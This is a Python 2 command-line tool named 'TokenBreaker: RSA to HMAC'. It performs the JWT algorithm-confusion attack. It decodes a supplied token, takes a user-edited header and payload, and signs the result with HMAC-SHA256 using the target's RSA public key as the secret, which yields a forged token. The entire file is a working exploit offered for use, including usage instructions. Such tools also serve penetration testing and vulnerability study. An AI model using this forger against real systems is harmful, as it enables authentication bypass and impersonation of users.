#!/usr/bin/python

import argparse
import requests
import base64
import hmac
import hashlib
import sys
from art import *
from huepy import *

def pad_check(data):
    missing_padding = len(data) % 4
    if missing_padding != 0:
        data += b'='* (4 - missing_padding)
    return data

def print_header(token,pubkey):
    base64header=pad_check(token.split('.')[0])
    base64payload=pad_check(token.split('.')[1])
    print blue("\nDecoded Header value is : "+base64.b64decode(base64header))
    print blue("Decode Payload value is : "+base64.b64decode(base64payload))
    header=raw_input("\nEnter your header Value: ")
    payload=raw_input("Enter your payload value: ")
    base64header = base64.b64encode(header).rstrip('=')
    base64payload = base64.b64encode(payload).rstrip('=')
    try:
        f=open(pubkey,'r')
    except IOError:
        print red("Unable to open file!")
        exit(1)
    headerandpayload = base64header + '.' + base64payload
    finaljwt = headerandpayload+'.'+base64.b64encode(hmac.new(f.read(), msg=headerandpayload, digestmod=hashlib.sha256).digest()).replace('/','_').replace('+','-').strip('=')
    print green("\nSuccessfully encoded Token: \n" + finaljwt)

def main():
    parser = argparse.ArgumentParser(description='TokenBreaker: 2.RSAtoHMAC',
            epilog='Example Usage: \npython RsatoHMAC.py -t [JWTtoken] -p [PathtoPublickeyfile]\n')
    requiredparser=parser.add_argument_group('required arguments')
    requiredparser.add_argument('-t','--token',help="JWT Token value",required=True)
    requiredparser.add_argument('-p','--pubkey',help="Path to Public key File",required=True)
    args = parser.parse_args()
    tprint('RSA to HMAC')
    print_header(args.token,args.pubkey)

if __name__=='__main__':
    main()
